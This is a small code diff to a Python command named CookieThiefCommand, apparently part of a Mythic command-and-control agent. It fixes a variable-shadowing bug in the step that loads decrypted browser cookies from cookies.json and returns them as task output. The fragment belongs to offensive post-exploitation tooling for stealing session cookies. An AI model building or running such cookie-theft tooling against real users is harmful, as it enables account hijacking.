@@ -155,8 +155,8 @@ class CookieThiefCommand(CommandBase):
                 if os.path.getsize("cookies.json") != 0:
                     await MythicRPC().execute("create_output",task_id=task.id,output="Cookies decrypted")
                     json_file = open("cookies.json", "r")
-                    json_file= json.load(json_file)
-                    cookie_dump = json.dumps(json_file, indent=4)
+                    json_load= json.load(json_file)
+                    cookie_dump = json.dumps(json_load, indent=4)
                     json_file.close()
                     await MythicRPC().execute("create_output",task_id=task.id,output=cookie_dump)
                 else:
